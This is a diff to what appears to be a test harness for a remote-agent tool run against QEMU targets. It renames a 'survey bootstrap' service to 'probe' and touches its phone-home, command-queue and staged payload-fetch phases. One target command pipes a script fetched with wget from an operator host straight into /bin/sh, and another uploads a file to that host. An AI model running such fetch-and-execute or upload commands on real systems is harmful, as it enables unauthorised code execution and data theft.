@@ -93,7 +93,7 @@ qemu_append = (str(env.get("append_args") or "") + " init=/bin/sh").strip()
 service_ports = {
     "command_queue": 22205,
     "file_service": 22204,
-    "survey_bootstrap": 22207,
+    "probe": 22207,
     "bridge": 22206,
 }
 
@@ -114,7 +114,7 @@ phases = [
     {
         "name": "offline-workflow-drain",
         "link_state": "target-workflow-link-up-short-window",
-        "operator_expectation": "target-workflow drains queued survey bootstrap and staged-file fetch commands during a short reconnect window, then TUI and headless status agree on delivered mailbox and heartbeat state",
+        "operator_expectation": "target-workflow drains queued probe bootstrap and staged-file fetch commands during a short reconnect window, then TUI and headless status agree on delivered mailbox and heartbeat state",
         "artifacts": ["offline-workflow-drain.json", "offline-workflow-drain-tui.json", "offline-workflow-drain-status.json", "offline-workflow-drain-tui-status.json", "offline-workflow-drain-poll-1.http", "offline-workflow-drain-poll-2.http"],
     },
     {
@@ -168,8 +168,8 @@ phases = [
     {
         "name": "survey-window",
         "link_state": "target-alpha-link-up",
-        "operator_expectation": "survey bootstrap script and result cross the QEMU network boundary",
-        "artifacts": ["after-survey-result.json", "survey-bootstrap-results.json"],
+        "operator_expectation": "probe bootstrap script and result cross the QEMU network boundary",
+        "artifacts": ["after-survey-result.json", "probe-results.json"],
     },
     {
         "name": "partial-transfer",
@@ -236,7 +236,7 @@ phase_evidence_checks = {
         {"artifact": "target-mismatch-phone-home.json", "path": "mailbox_record.status", "expect": "delivered"},
     ],
     "survey-window": [
-        {"artifact": "survey-bootstrap-results.json", "path": "status", "expect": "result-received"},
+        {"artifact": "probe-results.json", "path": "status", "expect": "result-received"},
         {"artifact": "after-survey-result.json", "path": "targets_by_id.target-alpha.latest_survey_result_id", "expect_present": True},
     ],
     "partial-transfer": [
@@ -290,7 +290,7 @@ phase_validation_contracts = [
             if phase["name"] == "offline-queue"
             else [
                 "target-workflow reconnects during the short window",
-                "queued survey bootstrap and staged-file fetch work are delivered",
+                "queued probe bootstrap and staged-file fetch work are delivered",
                 "last_seen, next_expected_poll, and phone-home status are refreshed",
             ]
             if phase["name"] == "offline-workflow-drain"
@@ -339,7 +339,7 @@ phase_validation_contracts = [
             ]
             if phase["name"] == "target-mismatch-phone-home"
             else [
-                "survey bootstrap crosses the QEMU network boundary",
+                "probe bootstrap crosses the QEMU network boundary",
                 "survey result is associated with the target",
             ]
             if phase["name"] == "survey-window"
@@ -561,20 +561,20 @@ for key, rec in path_requirements.items():
 
 phase_operator_commands = {
     "offline-queue": [
-        "scripts/grit-server --daemon --daemon-service command-queue --daemon-service file-service --daemon-service survey-bootstrap",
+        "scripts/grit-server --daemon --daemon-service command-queue --daemon-service file-service --daemon-service probe",
         "scripts/grit-server --target-id target-alpha --queue-command 'grit survey --json'",
         "scripts/grit-server --target-id target-bravo --queue-command 'grit survey --json'",
         "scripts/grit-server --line-tui",
         "scripts/grit-server --json-status > offline-status.json",
     ],
     "offline-workflow-drain": [
-        "scripts/grit-server --target-id target-workflow --run-target-workflow-action queue-survey-bootstrap",
+        "scripts/grit-server --target-id target-workflow --run-target-workflow-action queue-probe",
         "scripts/grit-server --target-id target-workflow --run-target-workflow-action stage-file-fetch --target-workflow-local-file ./payload.bin --target-workflow-request-name payload.bin",
         "scripts/grit-server --target-id target-workflow --json-status > offline-workflow-drain-status.json",
         "scripts/grit-server --line-tui --target-id target-workflow",
     ],
     "systemd-user-service": [
-        "scripts/grit-server --systemd-user-action print --systemd-user-dry-run --daemon-service command-queue --daemon-service file-service --daemon-service survey-bootstrap",
+        "scripts/grit-server --systemd-user-action print --systemd-user-dry-run --daemon-service command-queue --daemon-service file-service --daemon-service probe",
         "scripts/grit-server --systemd-user-action status --systemd-user-dry-run",
     ],
     "short-phone-home-window": [
@@ -601,7 +601,7 @@ phase_operator_commands = {
         "scripts/grit-server --target-id target-alpha --json-status > target-mismatch-phone-home.json",
     ],
     "survey-window": [
-        "scripts/grit-server --survey-bootstrap --survey-bootstrap-port 22207 --one-shot",
+        "scripts/grit-server --transport probe --probe-port 22207 --one-shot",
         "scripts/grit-server --target-id target-alpha --json-status > after-survey-result.json",
     ],
     "partial-transfer": [
@@ -643,7 +643,7 @@ phase_target_commands = {
         "grit command-queue result --target-id target-bravo --result-json command-result.json",
     ],
     "survey-window": [
-        "wget -O- http://<operator-ip>:22207/survey.sh | /bin/sh",
+        "wget -O- http://<operator-ip>:22207/probe.sh | /bin/sh",
     ],
     "partial-transfer": [
         "grit upload /tmp/evidence.txt --operator http://<operator-ip>:22204",
